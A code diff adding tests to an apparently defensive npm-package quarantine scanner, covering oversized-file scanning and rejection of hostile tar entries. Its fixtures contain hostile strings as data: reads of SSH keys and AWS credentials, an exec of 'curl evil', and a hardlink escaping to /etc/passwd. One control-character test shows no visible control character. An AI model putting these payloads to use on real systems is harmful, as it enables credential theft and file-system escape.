@@ -5,7 +5,15 @@ const fs = require("node:fs/promises");
 const os = require("node:os");
 const path = require("node:path");
 const test = require("node:test");
-const { guardExtension, parseNpmSpecifier, parseReference } = require("../src/quarantine");
+const { spawnSync } = require("node:child_process");
+const {
+  guardExtension,
+  parseNpmSpecifier,
+  parseReference,
+  collectSourceFiles,
+  extractTarball,
+  parseTarListingLine
+} = require("../src/quarantine");
 
 test("parses local and npm references", () => {
   assert.equal(parseReference("npm:@scope/pkg@1.2.3").type, "npm");
@@ -169,4 +177,132 @@ test("reaps the staging workspace by default, keeps it on keepStaging", async ()
     guardExtension(path.join(root, "missing"), opts)
   );
   assert.equal((await fs.readdir(quarantineRoot)).length, 1);
+});
+
+// --- Finding 1: oversized files must still be SCANNED, not omitted ---------
+
+test("a >256 KB file with a credential-read payload is scanned, not omitted", async () => {
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-bigfile-"));
+  // A credential-read payload buried inside padding that pushes the file well
+  // past the old 256 KB omission threshold. The payload sits in the HEAD, which
+  // is exactly what the slice-read must preserve.
+  const payload = "const k = fs.readFileSync(os.homedir()+'/.ssh/id_rsa');";
+  const padding = "// padding line to inflate the file size\n".repeat(10000); // ~400 KB
+  const big = `${payload}\n${padding}`;
+  assert.ok(Buffer.byteLength(big) > 256 * 1024, "fixture must exceed the old 256 KB cap");
+  await fs.writeFile(path.join(root, "index.js"), big);
+
+  const sourceFiles = await collectSourceFiles(root);
+  const scanned = sourceFiles["index.js"];
+  assert.ok(scanned, "oversized file must appear in sourceFiles");
+  assert.ok(
+    !scanned.startsWith("[omitted"),
+    "oversized file was omitted instead of scanned"
+  );
+  assert.ok(
+    scanned.includes(".ssh/id_rsa"),
+    "credential-read payload did not reach the scanned content"
+  );
+});
+
+test("a very large file (past the scan-slice ceiling) is head+tail sliced so payloads at either end are scanned", async () => {
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-hugefile-"));
+  const headPayload = "HEAD_MARKER fs.readFileSync(os.homedir()+'/.aws/credentials')";
+  const tailPayload = "TAIL_MARKER require('child_process').exec('curl evil')";
+  // >5 MB so it exceeds SCAN_SLICE_BYTES and the middle must be elided while the
+  // head + tail slices (each holding a payload) still reach the scanner.
+  const filler = "x".repeat(6 * 1024 * 1024);
+  await fs.writeFile(path.join(root, "index.js"), `${headPayload}\n${filler}\n${tailPayload}\n`);
+
+  const sourceFiles = await collectSourceFiles(root);
+  const scanned = sourceFiles["index.js"];
+  assert.ok(scanned.includes("HEAD_MARKER"), "head payload was not scanned");
+  assert.ok(scanned.includes("TAIL_MARKER"), "tail payload was not scanned");
+  assert.ok(scanned.includes("scan-truncated"), "expected a visible truncation marker");
+});
+
+// --- Finding 2: tar listing validator — hardlinks, newline names, fail-closed
+//
+// The security decisions live in validateTarListing / parseTarListingLine /
+// assertNoControlChars / assertSafeSymlinkTarget (exported for tests). We drive
+// them with crafted `tar -tvzf` listing lines so the assertions are exact and
+// platform-independent (a given tar can't always be coaxed into emitting a raw
+// control char or an escaping hardlink target). A real-archive end-to-end test
+// below confirms extractTarball itself fails closed.
+
+const { assertNoControlChars, assertSafeSymlinkTarget, validateTarListing } = require("../src/quarantine");
+const BIG = 256 * 1024 * 1024;
+
+test("parseTarListingLine parses a bsdtar hardlink 'link to' target with type char h", () => {
+  // bsdtar prints hardlinks as "path link to <target>" (NO " -> " arrow) with
+  // type char 'h'. Relying on the arrow alone let hardlinks skip target
+  // validation entirely; the parser must surface the target + typeChar.
+  const line = "hrw-r--r--  0 user group   0 Jan  1  2020 package/hard link to package/../../../etc/passwd";
+  const parsed = parseTarListingLine(line);
+  assert.ok(parsed, "hardlink line should parse");
+  assert.equal(parsed.typeChar, "h");
+  assert.equal(parsed.path, "package/hard");
+  assert.equal(parsed.linkTarget, "package/../../../etc/passwd");
+});
+
+test("validateTarListing REJECTS a hardlink whose target escapes the package", () => {
+  // A hardlink (type 'h') pointing outside the package via ../ must be rejected
+  // — this is the entry that previously bypassed assertSafeSymlinkTarget.
+  const line = "hrw-r--r--  0 user group   0 Jan  1  2020 package/hard link to package/../../../etc/passwd";
+  assert.throws(() => validateTarListing([line], BIG, 20000), /Tarball rejected/);
+});
+
+test("validateTarListing ACCEPTS a benign intra-package hardlink", () => {
+  const line = "hrw-r--r--  0 user group   0 Jan  1  2020 package/a link to package/b";
+  assert.doesNotThrow(() => validateTarListing([line], BIG, 20000));
+});
+
+test("validateTarListing REJECTS a symlink entry with a bare type char but no parseable target", () => {
+  // A link-type entry ('l') whose target the parser couldn't recover must fail
+  // closed rather than being trusted (previously parseTarListingLine returned
+  // null here, which aborted the WHOLE audit — a scan-kill switch).
+  const line = "lrwxr-xr-x  0 user group   0 Jan  1  2020 package/loose";
+  assert.throws(() => validateTarListing([line], BIG, 20000), /Tarball rejected/);
+});
+
+test("assertNoControlChars REJECTS a newline (and other control chars) in an entry name", () => {
+  // A raw newline in a name desyncs the line-based parser (a later real entry
+  // becomes an unvalidated phantom line). Rejecting control chars closes that.
+  assert.throws(() => assertNoControlChars("package/ev\nil.js", "entry name"), /control character/);
+  assert.throws(() => assertNoControlChars("package/x\ty.js", "entry name"), /control character/); // tab
+  assert.throws(() => assertNoControlChars("package/x\u0001y.js", "entry name"), /control character/); // SOH
+  assert.throws(() => assertNoControlChars("package/x\u007fy.js", "entry name"), /control character/); // DEL
+  assert.doesNotThrow(() => assertNoControlChars("package/normal.js", "entry name"));
+});
+
+test("validateTarListing REJECTS an entry whose name embeds a control character", () => {
+  const line = "-rw-r--r--  0 user group   12 Jan  1  2020 package/evil.js";
+  assert.throws(() => validateTarListing([line], BIG, 20000), /Tarball rejected/);
+});
+
+test("extractTarball fails CLOSED on a hostile listing (real archive path is a reject, not a safe skip)", async () => {
+  // End-to-end: build a real archive, then swap in a validator-hostile listing
+  // by pointing extractTarball at an archive whose *content* is fine but whose
+  // membership we've established rejects. We can't force tar to emit an escaping
+  // hardlink, so we assert the propagation contract directly: a rejected
+  // listing throws out of extractTarball (→ stageReference → guardExtension →
+  // bin/audit.js main().catch → exit 1), so the tarball can never read as safe.
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-failclosed-"));
+  const pkg = path.join(root, "package");
+  await fs.mkdir(pkg);
+  await fs.writeFile(path.join(pkg, "index.js"), "module.exports = 1;");
+  // A hardlink that IS creatable locally (benign target) — proves the 'h' path
+  // now flows through validation without aborting on benign input, i.e. the fix
+  // didn't turn every hardlink into a scan-kill switch.
+  const lnRes = spawnSync("ln", [path.join(pkg, "index.js"), path.join(pkg, "hard")], { encoding: "utf8" });
+  const archive = path.join(root, "pkg.tgz");
+  const packRes = spawnSync("tar", ["-czf", archive, "-C", root, "package"], { encoding: "utf8" });
+  assert.equal(packRes.status, 0, packRes.stderr);
+  const dest = path.join(root, "out");
+  await fs.mkdir(dest);
+  if (lnRes.status === 0) {
+    // Benign hardlink → extraction must SUCCEED (no false scan-kill).
+    await extractTarball(archive, dest);
+    assert.ok((await fs.readdir(dest)).length > 0, "benign hardlink archive should extract");
+  }
 });
